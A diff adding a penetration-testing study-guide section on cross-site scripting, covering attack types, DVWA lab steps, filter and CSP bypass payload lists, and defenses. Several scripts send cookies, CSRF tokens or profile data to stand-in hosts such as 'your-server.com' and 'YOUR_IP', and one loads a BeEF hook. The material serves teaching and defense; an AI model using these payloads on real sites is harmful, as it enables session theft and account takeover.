@@ -16719,6 +16719,1662 @@ A clear, well-documented authorization finding is one of the most impactful item
 
 ---
 
-*— Sections 6.5 and 6.6 are complete. Module 6 continues with Section 6.7: Understanding Cross-Site Scripting (XSS) Vulnerabilities. —*
+*— Sections 6.5 and 6.6 are complete.  —*
+
+---
+# Module 6 — Sections 6.7, 6.8, 6.9, and 6.10
+
+> **CompTIA PenTest+ / Ethical Hacking Certification Series**
+> *Professional Reference Guide — GitHub Edition*
+> *XSS · CSRF · SSRF · Clickjacking · Directory Traversal · Cookie Manipulation*
+
+---
+
+## Table of Contents
+
+- [6.7 Understanding Cross-Site Scripting (XSS) Vulnerabilities](#67-understanding-cross-site-scripting-xss-vulnerabilities)
+  - [6.7.1 Overview — What XSS Really Is and Why It Matters](#671-overview--what-xss-really-is-and-why-it-matters)
+  - [6.7.2 Reflected XSS Attacks](#672-reflected-xss-attacks)
+  - [6.7.3 Practice — Reflected XSS Attacks](#673-practice--reflected-xss-attacks)
+  - [6.7.4 Stored XSS Attacks](#674-stored-xss-attacks)
+  - [6.7.5 Practice — Stored XSS Attacks](#675-practice--stored-xss-attacks)
+  - [6.7.6 XSS Evasion Techniques](#676-xss-evasion-techniques)
+  - [6.7.7 XSS Mitigations](#677-xss-mitigations)
+  - [6.7.8 Lab — Cross-Site Scripting](#678-lab--cross-site-scripting)
+- [6.8 Understanding CSRF/XSRF and Server-Side Request Forgery](#68-understanding-csrfxsrf-and-server-side-request-forgery)
+  - [6.8.1 Overview — CSRF and SSRF](#681-overview--csrf-and-ssrf)
+  - [6.8.2 Practice — CSRF and SSRF Attacks](#682-practice--csrf-and-ssrf-attacks)
+- [6.9 Understanding Clickjacking](#69-understanding-clickjacking)
+- [6.10 Exploiting Security Misconfigurations](#610-exploiting-security-misconfigurations)
+  - [6.10.1 Overview](#6101-overview)
+  - [6.10.2 Directory Traversal Vulnerabilities](#6102-directory-traversal-vulnerabilities)
+  - [6.10.3 Practice — Directory Traversal](#6103-practice--directory-traversal)
+  - [6.10.4 Cookie Manipulation Attacks](#6104-cookie-manipulation-attacks)
+
+---
+
+## 6.7 Understanding Cross-Site Scripting (XSS) Vulnerabilities
+
+### 6.7.1 Overview — What XSS Really Is and Why It Matters
+
+#### The Precise Definition and the Mindset Shift
+
+Cross-Site Scripting, universally abbreviated XSS (to avoid confusion with CSS — Cascading Style Sheets), is a class of vulnerabilities where an attacker injects malicious client-side code — almost always JavaScript — into a web page that is subsequently viewed by other users. The browser executing that page has no way to distinguish between the application's own legitimate JavaScript and the attacker's injected script. Both run with the same origin, the same trust level, and the same access to the page's DOM, cookies, and data.
+
+Here is the mindset shift that separates average practitioners from skilled ones: **XSS is not primarily an "alert box" vulnerability**. The alert box — `<script>alert(1)</script>` — is the proof-of-concept that confirms JavaScript executes. But the actual attack is anything you can do with JavaScript running in the victim's browser context. That context is extremely powerful:
+
+- Read every cookie accessible to the domain (including session tokens, unless HttpOnly)
+- Make authenticated HTTP requests on behalf of the user — with their session, to their bank, to their SaaS platform, to their corporate intranet
+- Read the entire DOM — extracting form values, CSRF tokens, displayed sensitive data
+- Modify the DOM — changing what the user sees, injecting fake login forms, replacing download links with malicious ones
+- Access the browser's Web Storage (localStorage, sessionStorage) — which often contains JWT tokens
+- Use the browser as a pivot to attack internal networks via SSRF-through-XSS
+- Redirect the user to attacker-controlled pages
+- Capture keystrokes in real time
+- Take screenshots of the current page using browser APIs
+- Use the browser as a botnet node for DDoS or for making requests to other sites
+
+The impact of XSS ranges from low (reflected XSS on a low-traffic page with no sensitive functionality) to critical (stored XSS in an admin panel that deploys the same payload to every administrator who views it, combined with CSRF token extraction to perform administrative actions). Context determines severity. One of the most important professional skills is recognizing and communicating which context makes an XSS finding critical rather than medium.
+
+#### The Three Types of XSS — Not Three Variations, Three Different Architectures
+
+The three XSS types differ fundamentally in **where the payload is stored and how it reaches the victim's browser**. This distinction determines persistence, attack reach, detection difficulty, and exploitation technique.
+
+**Reflected XSS:** The payload is embedded in the request (typically a URL parameter) and reflected directly in the response. Not stored anywhere server-side. Requires the attacker to deliver the crafted URL to the victim. Affects one victim at a time.
+
+**Stored XSS (Persistent XSS):** The payload is stored on the server (database, filesystem, cache) and served to every user who accesses the affected page. No URL delivery needed. Affects every user who views the infected content.
+
+**DOM-based XSS:** The vulnerability exists entirely in client-side JavaScript. The server never sees the malicious payload — the JavaScript on the page reads from an attacker-controlled source (URL fragment, `document.location`, `document.referrer`, `window.name`) and writes it to a dangerous DOM sink without sanitization. The server's response may be perfectly safe — the vulnerability lives in the browser.
+
+Understanding DOM XSS requires understanding DOM sources and sinks, which we will cover in detail.
+
+---
+
+### 6.7.2 Reflected XSS Attacks
+
+#### How Reflected XSS Works — The Mechanism
+
+Reflected XSS is the most basic and most commonly encountered XSS type. The attack flow is:
+
+1. The application receives user-controlled input (from a URL parameter, a form field, a search query)
+2. The application embeds this input directly into the HTML response without encoding it
+3. The victim's browser parses the HTML, encounters the injected script, and executes it
+
+The "reflection" is literal — the server reflects the input back in the output. The server is acting as a delivery mechanism for the attacker's payload, using the victim's own browser as the execution environment.
+
+A vulnerable search endpoint might look like this in PHP:
+
+```php
+<?php
+// VULNERABLE: user input reflected directly into HTML
+$search = $_GET['q'];
+echo "<h2>Results for: $search</h2>";
+?>
+```
+
+When a user searches for "laptop", the HTML output is:
+```html
+<h2>Results for: laptop</h2>
+```
+
+When an attacker crafts the URL `https://target.com/search?q=<script>alert(1)</script>`, the output becomes:
+```html
+<h2>Results for: <script>alert(1)</script></h2>
+```
+
+The browser parses the HTML, reaches the `<script>` tag, and executes the JavaScript.
+
+#### The Delivery Problem — Phishing as the Attack Vector
+
+Reflected XSS requires the attacker to deliver the crafted URL to the victim. This is commonly done through:
+- Phishing emails with embedded links
+- Social media messages
+- QR codes
+- Other websites with redirect capabilities (open redirect chains)
+- Short URL services that obscure the actual URL
+
+The trust factor is critical: because the URL begins with the victim's trusted domain (`https://victim-bank.com/search?q=...`), the victim may not notice anything suspicious. They trust the domain, click the link, and their own browser executes the attacker's code under the bank's origin.
+
+#### Context Matters Enormously — Where is the Reflection?
+
+The context where your input is reflected determines which characters are dangerous and what payload syntax is required. This is the most important technical concept in XSS:
+
+**HTML body context:**
+Input is reflected between HTML tags.
+```html
+<p>Search results for: [INPUT]</p>
+```
+Dangerous characters: `<`, `>`, `&`
+Basic payload: `<script>alert(1)</script>`
+
+**HTML attribute context:**
+Input is reflected inside an HTML attribute value.
+```html
+<input value="[INPUT]" type="text">
+```
+You must first close the attribute, then close the tag, then inject script:
+`" onmouseover="alert(1)" ` — adds an event handler attribute
+`"><script>alert(1)</script>` — closes the attribute and tag, injects new element
+
+**JavaScript string context:**
+Input is reflected inside a JavaScript string literal.
+```javascript
+var searchTerm = '[INPUT]';
+```
+You must break out of the string first:
+`'; alert(1); //`
+This closes the string, executes the script, and comments out the remainder.
+
+**HTML attribute with JavaScript context (event handlers):**
+```html
+<img src="x" onerror="handleError('[INPUT]')">
+```
+Escape the JavaScript string context:
+`'); alert(1); //`
+
+**URL context:**
+Input is reflected inside a URL attribute like `href` or `src`:
+```html
+<a href="[INPUT]">Click here</a>
+```
+Use JavaScript protocol:
+`javascript:alert(1)`
+
+**Understanding context is the difference between a tester who confirms XSS and one who can actually exploit it.** If you inject `<script>alert(1)</script>` but the reflection is inside a JavaScript string, it will not work. If the reflection is inside an HTML attribute, you need attribute-context payloads. Recognizing context from the page source is a fundamental skill.
+
+#### DOM XSS — A Completely Different Attack Architecture
+
+DOM-based XSS requires a shift in how you think about the attack. In reflected and stored XSS, the vulnerability is that the **server** outputs unsanitized data into HTML. In DOM XSS, the **server's output is fine**. The vulnerability is in the client-side JavaScript that reads from a source and writes to a sink without sanitization.
+
+**Sources** — where the JavaScript reads attacker-controlled data:
+- `document.URL` / `document.location` — current URL
+- `document.location.href` — full URL including fragment (`#`)
+- `document.location.hash` — the fragment identifier (after `#`) — never sent to server
+- `document.referrer` — referring page URL
+- `document.cookie` — cookie values
+- `localStorage` / `sessionStorage` — web storage
+- `window.name` — survives page navigation across origins
+- `postMessage` events — messages from other frames or windows
+
+**Sinks** — where the JavaScript writes data and dangerous execution can occur:
+- `element.innerHTML = source` — most dangerous: injects arbitrary HTML including scripts
+- `document.write(source)` — writes raw HTML to the document
+- `eval(source)` — executes the source as JavaScript code directly
+- `setTimeout(source, time)` — executes string as JavaScript
+- `setInterval(source, time)` — executes string as JavaScript
+- `element.src = source` — if set to `javascript:` protocol
+- `window.location = source` — can navigate to `javascript:` URL
+- `element.setAttribute('onclick', source)` — adds executable event handlers
+
+**DOM XSS example:**
+
+The URL: `https://target.com/page#<script>alert(1)</script>`
+
+The client-side JavaScript:
+```javascript
+// VULNERABLE: reads from URL fragment (never sent to server) and writes to innerHTML
+document.getElementById('welcome').innerHTML = document.location.hash.substring(1);
+```
+
+Because the hash is read client-side and written to `innerHTML`, the server never sees the payload. Server logs show no injection. Server output is clean HTML. Yet the browser executes the attacker's script.
+
+**Why DOM XSS is harder to find:**
+Traditional web scanners send HTTP requests and analyze responses. Since the server's response contains no injection in DOM XSS, response-based scanning misses it completely. DOM XSS requires JavaScript execution for analysis — tools like **Burp Suite's DOM Invader** or **DOMPurify's test suite** can find these, as can manual JavaScript code review.
+
+```javascript
+// Tools and techniques for DOM XSS hunting:
+
+// 1. Burp Suite DOM Invader (browser extension):
+// Automatically instruments the DOM to detect sources and sinks
+// Navigate the target application with DOM Invader active
+// It highlights every source→sink flow for investigation
+
+// 2. Manual source review — search JS files for dangerous patterns:
+// These regex patterns in source code indicate potential DOM XSS sinks:
+innerHTML
+outerHTML
+document.write
+document.writeln
+eval(
+setTimeout(
+setInterval(
+location.href
+location.hash
+location.search
+```
+
+---
+
+### 6.7.3 Practice — Reflected XSS Attacks
+
+#### The Step-by-Step Testing Methodology
+
+Reflected XSS testing is systematic: find inputs, understand the reflection context, craft context-appropriate payloads, confirm execution.
+
+**Step 1: Find all input reflection points**
+
+Every parameter that might be reflected must be tested:
+- URL query parameters: `?search=`, `?id=`, `?name=`, `?message=`
+- URL path segments: `/user/alice` where "alice" appears in the response
+- POST body parameters: form inputs reflected back on error pages
+- HTTP headers: User-Agent, Referer, X-Forwarded-For (some appear in error pages or analytics)
+
+**Step 2: Send a unique test string to identify reflection**
+
+Before injecting JavaScript, identify where and how your input appears in the HTML. Send a unique, harmless string:
+```
+xss123test
+```
+Search the page source for this string. Find every location where it appears and note the surrounding HTML context.
+
+**Step 3: Determine the context and craft the appropriate payload**
+
+| Context Found | Your Test String Appears In | Context-Breaking Payload |
+|---------------|-----------------------------|--------------------------|
+| Between HTML tags | `<p>xss123test</p>` | `<script>alert(1)</script>` |
+| Inside double-quoted attribute | `value="xss123test"` | `" onmouseover="alert(1)` |
+| Inside single-quoted attribute | `value='xss123test'` | `' onmouseover='alert(1)` |
+| Inside JavaScript string (double) | `var x = "xss123test";` | `"; alert(1); //` |
+| Inside JavaScript string (single) | `var x = 'xss123test';` | `'; alert(1); //` |
+| Inside JavaScript template literal | `` var x = `xss123test`; `` | `` `; alert(1); `` |
+| Inside HTML href/src attribute | `href="xss123test"` | `javascript:alert(1)` |
+| After `?` in URL inside href | `href="/path?x=xss123test"` | `&quot;><script>alert(1)</script>` |
+
+**Step 4: Test the payload, observe the result**
+
+Use Burp Suite Repeater to send modified requests. Observe the response in Burp's HTML Render tab. When the alert fires, XSS is confirmed.
+
+**Practicing on DVWA — Reflected XSS:**
+
+DVWA's Reflected XSS page (Low security) takes a "What's your name?" input and reflects it back.
+
+```
+Input: <script>alert('XSS')</script>
+Result: Alert fires — XSS confirmed at Low security
+
+Medium security adds some filtering. Test with:
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+
+High security: Read the source code to see exactly what filtering is applied,
+then craft a bypass specific to that filter.
+```
+
+#### The Impact Demonstration — From Alert to Session Theft
+
+An `alert(1)` payload is proof of concept. In a real assessment, you need to demonstrate actual impact to convey the true severity. The most impactful and clearest demonstration is session cookie theft:
+
+```javascript
+// Session theft payload — sends the victim's cookies to your server:
+<script>
+var img = new Image();
+img.src = 'https://your-server.com/capture?cookie=' + encodeURIComponent(document.cookie);
+</script>
+
+// For HttpOnly cookies (not readable via document.cookie), demonstrate XSS impact
+// by making an authenticated request and exfiltrating the response:
+<script>
+fetch('/api/user/profile')
+  .then(r => r.json())
+  .then(data => {
+    fetch('https://your-server.com/capture', {
+      method: 'POST',
+      body: JSON.stringify(data)
+    });
+  });
+</script>
+
+// CSRF token theft — enables forging authenticated requests:
+<script>
+var req = new XMLHttpRequest();
+req.open('GET', '/account/settings', true);
+req.onload = function() {
+  var match = req.responseText.match(/name="csrf_token" value="([^"]+)"/);
+  if (match) {
+    fetch('https://your-server.com/capture?csrf=' + match[1]);
+  }
+};
+req.send();
+</script>
+```
+
+**Setting up a simple capture server on Kali:**
+```bash
+# Python HTTP listener (captures GET requests):
+python3 -m http.server 8000
+
+# Ngrok for tunneling (makes your local server accessible from the internet):
+ngrok http 8000
+# Returns a public URL like: https://abc123.ngrok.io
+
+# Your capture URL: https://abc123.ngrok.io/capture?cookie=...
+# Incoming cookie captures appear in ngrok's web interface at localhost:4040
+```
+
+---
+
+### 6.7.4 Stored XSS Attacks
+
+#### Why Stored XSS Is More Dangerous Than Reflected
+
+Stored XSS (also called persistent XSS) changes the attack model fundamentally. Instead of needing to deliver a crafted URL to a specific victim, the attacker injects a payload that persists on the server and executes for every user who views the infected content — automatically, without any further attacker action.
+
+Consider these scenarios:
+
+**Scenario 1 — Comment section XSS:**
+An attacker posts a comment containing a script payload on a blog with 50,000 readers. Every person who loads the blog page executes the script. The attacker's payload runs in 50,000 browsers over the next days and weeks. The attacker only acted once.
+
+**Scenario 2 — Stored XSS in an admin notification panel:**
+An attacker submits a support ticket containing a payload. When any administrator opens the support queue to read the ticket, the script executes in their privileged browser session. The attacker can extract the admin's CSRF token, use it to add a new administrator account, and achieve administrative access to the application — all triggered when an admin clicks "View Tickets."
+
+**Scenario 3 — Profile XSS:**
+An attacker stores a payload in their profile biography. Any user who views that profile executes the script. If the biography is displayed on a social platform with millions of users, the scale is massive.
+
+The severity hierarchy: Stored XSS in an admin-visible location is almost always Critical. Stored XSS visible only to the attacker themselves is Low (they are attacking themselves). Stored XSS visible to regular users is High. The location and audience of the persistence is the primary severity determinant.
+
+#### Where Stored XSS Appears — Attack Surface Mapping
+
+Every location where user input is stored and subsequently displayed to other users is a potential stored XSS target:
+
+- Comment fields on blog posts, articles, tickets
+- Forum posts and replies
+- User profile fields (name, biography, location, job title)
+- Product reviews and ratings
+- Chat messages
+- Log viewers that display user activity
+- Error logs rendered in web-based admin panels
+- User-Agent and Referer headers stored in access logs
+- Upload filenames displayed in file management interfaces
+- Email addresses displayed in admin panels (if registered with a malicious address)
+- Any form of user-generated content displayed to others
+
+**The subtle attack surfaces often missed:**
+
+HTTP headers are frequently logged and displayed in admin analytics dashboards. If the admin panel shows "Recent Requests" with the User-Agent and Referer from each visitor, storing XSS in those headers provides persistent execution in every admin's browser when they view the analytics panel.
+
+File upload attack: Upload a file with a name like `"><script>alert(1)</script>.jpg`. If the filename is stored in the database and displayed unsanitized in the file management interface, every user viewing that interface executes the payload.
+
+#### Stored XSS vs Second-Order Injection
+
+Second-order injection is a related concept worth understanding. In standard stored XSS, the payload is injected and executed on the same page. In second-order injection, the payload is stored safely during initial input but then incorporated into a dangerous context later — perhaps when the data is used in a different part of the application that applies different (weaker) sanitization.
+
+For example: a username is stored with HTML entities escaped, so the profile creation page is safe. But when the username is used to generate an email (`"Hello [username]," + email_body`), and that email content is later displayed in the application's sent-mail viewer with different encoding settings, the stored data becomes executable.
+
+Testing for second-order injection requires tracing how stored data flows through the application — which requires understanding the application's full functionality and data flows, not just testing input fields in isolation.
+
+---
+
+### 6.7.5 Practice — Stored XSS Attacks
+
+#### Testing Stored XSS in DVWA
+
+DVWA's Stored XSS module simulates a guestbook where users leave messages. The name and message are stored in the database and displayed to all visitors.
+
+**Low security test:**
+```
+Name: Attacker
+Message: <script>alert(document.cookie)</script>
+
+Result: Every visitor to the guestbook page sees the cookie alert.
+The message persists until the administrator clears the database.
+```
+
+**Impact escalation — steal admin session:**
+```javascript
+// In DVWA's Stored XSS (Low), inject a payload that phones home with cookies:
+<script>
+document.write('<img src="http://YOUR_IP:8000/steal?c='+document.cookie+'" />')
+</script>
+
+// Start your listener:
+python3 -m http.server 8000
+
+// When the admin reviews the guestbook, your listener receives:
+// GET /steal?c=PHPSESSID=abc123; security=low HTTP/1.1
+
+// Import that PHPSESSID cookie in your browser:
+// You are now the admin.
+```
+
+**Medium security bypass:**
+Medium security strips `<script>` tags. Use event handler payloads that do not require the script tag:
+```
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body/onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+```
+
+**The professional approach — BeEF hook for full browser control:**
+Instead of a simple alert, inject BeEF's hook URL to turn the victim's browser into a command-and-control node:
+
+```html
+<script src="http://your-kali-ip:3000/hook.js"></script>
+```
+
+When the victim loads the infected page, their browser connects to BeEF. You can then execute dozens of attack modules — screenshots, keylogging, credential phishing with fake dialogs, port scanning the internal network, and more.
+
+---
+
+### 6.7.6 XSS Evasion Techniques
+
+#### The Filter Bypass Mindset
+
+Filters that block XSS are security controls that stand between your payload and execution. Understanding how filters work — and where they fail — is essential for both penetration testing (to confirm real impact) and for defenders (to understand the limits of their controls).
+
+The key insight: **most XSS filters are blacklist-based** — they block specific strings like `<script>` or `onerror=`. Blacklists are inherently limited because the HTML specification and browser behavior are extraordinarily permissive. Browsers are designed to render malformed, incomplete, and unusual HTML as gracefully as possible. This permissiveness creates thousands of ways to achieve script execution that bypass any blacklist.
+
+#### Technique 1 — Case Variation
+
+HTML tags are case-insensitive. JavaScript keywords are case-sensitive, but event handler names are not (browsers normalize them):
+```html
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+<sCrIpT>alert(1)</sCrIpT>
+
+<IMG SRC=x ONERROR=alert(1)>
+<img src=x OnErRoR=alert(1)>
+```
+
+#### Technique 2 — Encoding the Payload
+
+Browsers decode multiple layers of encoding before executing. If filters operate on the raw input but browsers decode before rendering:
+
+```
+# HTML entity encoding — browser decodes before DOM interpretation:
+&lt;script&gt;alert(1)&lt;/script&gt;
+→ Browsers render: <script>alert(1)</script>
+
+# Decimal HTML entities:
+&#60;script&#62;alert(1)&#60;/script&#62;
+→ Renders: <script>alert(1)</script>
+
+# Hex HTML entities:
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+→ Renders: <script>alert(1)</script>
+
+# URL encoding (for parameters):
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# Double URL encoding:
+%253Cscript%253E
+→ First decode: %3Cscript%3E
+→ Second decode: <script>
+
+# JavaScript unicode escapes (inside JS string contexts):
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# JavaScript hex escapes:
+\x3cscript\x3ealert(1)\x3c/script\x3e
+```
+
+#### Technique 3 — Alternative Tags and Event Handlers
+
+When `<script>` is blocked, hundreds of other tags with event handlers work:
+
+```html
+<!-- Image-based execution (fires when src fails to load): -->
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src="javascript:alert(1)">
+
+<!-- SVG namespace (expands available handlers): -->
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+
+<!-- Audio/Video elements: -->
+<audio src=x onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+
+<!-- Input/Form elements: -->
+<input autofocus onfocus=alert(1)>
+<input type=text onblur=alert(1) autofocus>
+<input type=image src=x:x onerror=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+
+<!-- Interactive elements: -->
+<details open ontoggle=alert(1)>
+<details ontoggle=alert(1) open>
+
+<!-- Body element (if injection is in body context): -->
+<body onload=alert(1)>
+<body onscroll=alert(1)>
+<body onresize=alert(1)>
+<body onpageshow=alert(1)>
+
+<!-- HTML5 newer elements: -->
+<marquee onstart=alert(1)>
+<meter onmouseover=alert(1)>
+<object data=javascript:alert(1)>
+<iframe src=javascript:alert(1)>
+```
+
+#### Technique 4 — Breaking Out of Attribute Context
+
+When input is inside an attribute value:
+```html
+<!-- Input is inside a quoted attribute: -->
+<input value="[INJECTION]" type="text">
+
+<!-- Payloads that break out: -->
+"><script>alert(1)</script>           <!-- Close quote, close tag, inject -->
+" onmouseover="alert(1)              <!-- Add new event attribute -->
+" onfocus="alert(1)" autofocus="    <!-- Add focus-triggered handler -->
+";<script>alert(1)</script>           <!-- Semicolon for some parsers -->
+
+<!-- When quotes are filtered but the attribute value is unquoted: -->
+<input value=[INJECTION] type=text>
+  → Inject: onmouseover=alert(1)     <!-- Treated as new attribute -->
+```
+
+#### Technique 5 — Breaking Out of JavaScript Context
+
+```javascript
+// Input is inside a JS string:
+var name = '[INJECTION]';
+
+// Payloads:
+'; alert(1); //           // Close string, execute, comment rest
+';alert(1)//              // Minimal whitespace
+\'; alert(1); //          // If backslash escaping is flawed
+'-alert(1)-'             // Arithmetic trick stays in expression
+
+// Template literal context:
+var name = `[INJECTION]`;
+// Payload:
+`; alert(1); //
+${alert(1)}              // Template literal expression injection
+
+// Inside function call:
+setTimeout('[INJECTION]', 1000);
+// Payload (becomes executable when setTimeout runs):
+alert(1)
+```
+
+#### Technique 6 — Whitespace and Separator Tricks
+
+```html
+<!-- Extra whitespace between tag name and attributes: -->
+<img      src=x     onerror=alert(1)>
+
+<!-- Null bytes (in some parsers): -->
+<scr\x00ipt>alert(1)</scr\x00ipt>
+
+<!-- Tab and newline characters: -->
+<img src=x
+onerror
+=
+alert(1)>
+
+<!-- Slash between tag name and attribute: -->
+<img/src=x/onerror=alert(1)>
+```
+
+#### Technique 7 — JavaScript Without Parentheses or Quotes
+
+Some WAFs block `alert(` or function calls with parentheses:
+
+```javascript
+// Call without parentheses using tagged template literals (ES6):
+alert`1`
+alert`XSS`
+
+// Call via various indirect methods:
+[1].find(alert)          // Passes alert to Array.find which calls it
+[1].every(alert)
+[1].filter(alert)
+[1].forEach(alert)
+
+// Using throw:
+throw alert(1)
+
+// Chaining:
+location=`javascript:alert\`1\``
+
+// Via Function constructor:
+Function`a${alert(1)}```
+(new Function('alert(1)'))()
+```
+
+#### Technique 8 — Mutation XSS (mXSS)
+
+Mutation XSS exploits inconsistencies between how a sanitizer parses HTML and how the browser subsequently parses the same sanitized string when it is inserted into the DOM. The sanitizer sees safe input. The browser's DOM parser mutates the sanitized string during rendering, re-creating a dangerous element.
+
+This is the most sophisticated XSS bypass class and is why even mature sanitization libraries like DOMPurify have historically had mXSS bypasses. The browser's HTML parser is a complex, quirky piece of software with thousands of special cases, and sanitizers sometimes miss edge cases in parsing behavior.
+
+```html
+<!-- Classic mXSS bypass (historical DOMPurify bypass pattern): -->
+<!-- Input that looks safe to the sanitizer but mutates in browser: -->
+<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style>
+<img onerror=alert(1) src>">
+```
+
+For current mXSS payloads, consult PortSwigger's XSS cheat sheet which is actively maintained and updated.
+
+#### Technique 9 — CSP Bypass
+
+Content Security Policy (CSP) is the primary defense against XSS exploitation. Even when XSS exists, a strong CSP prevents the injected script from executing or from making unauthorized requests. But CSP is frequently misconfigured in ways that allow bypass.
+
+**Bypass 1 — `unsafe-inline` present:**
+```
+Content-Security-Policy: script-src 'self' 'unsafe-inline'
+```
+`unsafe-inline` allows inline scripts entirely, rendering CSP useless against XSS. Any payload works.
+
+**Bypass 2 — `unsafe-eval` present:**
+```
+Content-Security-Policy: script-src 'self' 'unsafe-eval'
+```
+`unsafe-eval` allows `eval()`, `setTimeout(string)`, `setInterval(string)`, and `Function()`. Even if inline scripts are blocked, these vectors remain.
+
+**Bypass 3 — JSONP endpoints on whitelisted domains:**
+```
+Content-Security-Policy: script-src 'self' https://trusted-cdn.com
+```
+If `trusted-cdn.com` hosts a JSONP endpoint (`?callback=alert(1)`), it can be used to execute arbitrary JavaScript under the whitelisted origin:
+```html
+<script src="https://trusted-cdn.com/api/data?callback=alert(1)"></script>
+```
+
+**Bypass 4 — Angular, Vue, or other framework injection via whitelisted CDN:**
+If the CSP whitelists a CDN that hosts Angular or Vue:
+```html
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+```
+
+**Bypass 5 — base-uri not set:**
+If CSP does not include `base-uri 'none'`, an attacker can inject a `<base>` tag to change the base URL for all relative links, then serve malicious scripts from their own domain:
+```html
+<base href="https://attacker.com/">
+```
+All relative script paths now load from the attacker's server.
+
+**Bypass 6 — Nonce reuse or predictable nonces:**
+CSP with nonces should generate a fresh random nonce per page load. If the nonce is static or predictable, it can be used in injected scripts:
+```html
+<!-- CSP: script-src 'nonce-abc123' -->
+<!-- If nonce abc123 is known, injected scripts using it bypass CSP: -->
+<script nonce="abc123">alert(1)</script>
+```
+
+**Testing CSP with online tools:**
+Use [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) to analyze any CSP header and identify bypass vectors automatically.
+
+---
+
+### 6.7.7 XSS Mitigations
+
+#### Defense 1 — Context-Aware Output Encoding (The Primary Defense)
+
+Output encoding converts special characters into safe representations for the rendering context. This is the most important XSS defense. The key is using the right encoding for the right context — wrong context encoding is not protective.
+
+| Output Context | Encoding Required | Example |
+|----------------|------------------|---------|
+| HTML body | HTML entity encoding | `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;` |
+| HTML attribute (quoted) | HTML attribute encoding | All special chars encoded |
+| JavaScript string | JavaScript Unicode escaping | `'` → `\x27`, `<` → `\x3C` |
+| URL parameter | URL encoding | `<` → `%3C` |
+| CSS value | CSS hex encoding | `<` → `\3C` |
+| JSON in HTML | JSON encoding + HTML encoding | Double encoded |
+
+Frameworks that auto-encode:
+- **React**: JSX auto-encodes all expressions (`{userInput}` is safe; `dangerouslySetInnerHTML` is not)
+- **Angular**: Template binding (`{{}}`) auto-encodes; `[innerHTML]` binding does not
+- **Vue**: Template binding auto-encodes; `v-html` does not
+
+**Never use:**
+- `innerHTML = userInput` — injects raw HTML
+- `document.write(userInput)` — injects raw HTML
+- `eval(userInput)` — executes as JavaScript
+
+#### Defense 2 — Content Security Policy (CSP)
+
+A properly configured CSP is a significant barrier to XSS exploitation, even when the vulnerability exists. The modern recommended CSP approach:
+
+```
+Content-Security-Policy: 
+  default-src 'none';
+  script-src 'nonce-{random}' 'strict-dynamic';
+  style-src 'nonce-{random}';
+  img-src https:;
+  font-src https:;
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'none';
+  form-action 'self';
+  upgrade-insecure-requests;
+```
+
+Key elements:
+- `nonce-{random}` — a per-page-load random value included on every legitimate script tag. Inline injection without the nonce is blocked.
+- `strict-dynamic` — allows scripts loaded by nonced scripts to also load, without needing to whitelist CDNs (the whitelist approach is bypassable).
+- `frame-ancestors 'none'` — also prevents Clickjacking (replaces X-Frame-Options).
+- `base-uri 'none'` — prevents base tag injection.
+- `form-action 'self'` — prevents form hijacking.
+
+CSP is a defense-in-depth control, not a primary fix. Fix the output encoding. Use CSP as an additional layer.
+
+#### Defense 3 — HttpOnly and Secure Cookie Flags
+
+Setting `HttpOnly` on session cookies prevents JavaScript from reading them. This blocks the most common XSS attack goal (session theft via `document.cookie`). It does not prevent XSS exploitation entirely — attackers can still perform actions as the victim — but it removes the most impactful attack vector.
+
+#### Defense 4 — Trusted Types (Modern Chrome Defense)
+
+Trusted Types is a browser API that requires JavaScript code to explicitly opt into potentially dangerous DOM operations by using approved, safe implementations. Applications that adopt Trusted Types cannot use `innerHTML`, `document.write`, or `eval` with raw strings — they must use Trusted Types policies that apply sanitization.
+
+```javascript
+// In JavaScript, with Trusted Types enforced:
+// This fails (rejects raw string):
+document.getElementById('output').innerHTML = userInput;  // Throws TypeError
+
+// This succeeds (uses approved policy):
+const policy = trustedTypes.createPolicy('default', {
+  createHTML: (str) => DOMPurify.sanitize(str)  // Sanitization applied
+});
+document.getElementById('output').innerHTML = policy.createHTML(userInput);
+```
+
+---
+
+### 6.7.8 Lab — Cross-Site Scripting
+
+#### Complete DVWA XSS Practice Sequence
+
+**Reflected XSS — Full Exploitation Chain:**
+
+```
+Low:    <script>alert(document.cookie)</script>
+         → Confirms cookie accessible via XSS
+         → Now demonstrate session theft as described above
+
+Medium: <img src=x onerror=alert(document.cookie)>
+         → Bypasses <script> tag filter
+         → Same impact
+
+High:   Examine the source code
+         → High security adds a strict regex filter
+         → Find what it does NOT filter
+         → Often SVG payloads or event-based payloads bypass strict script filters
+```
+
+**Stored XSS — Maximum Impact Demonstration:**
+
+```
+Step 1: Inject BeEF hook in the message field:
+<script src="http://KALI_IP:3000/hook.js"></script>
+
+Step 2: Start BeEF: sudo beef-xss
+
+Step 3: Visit the guestbook page as another user (or admin)
+        → Their browser appears in BeEF panel
+
+Step 4: Execute "Pretty Theft" module → Google login overlay captures credentials
+
+Step 5: Execute "Get Cookie" module → retrieves cookies
+        (even HttpOnly ones are not directly readable, but the Pretty Theft
+         demonstrates what real credential theft looks like)
+```
+
+#### PortSwigger Web Security Academy XSS Labs
+
+The PortSwigger XSS labs at [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting) provide the best structured XSS practice available online. Complete at minimum:
+- Reflected XSS into HTML context with nothing encoded
+- Stored XSS into HTML context with nothing encoded
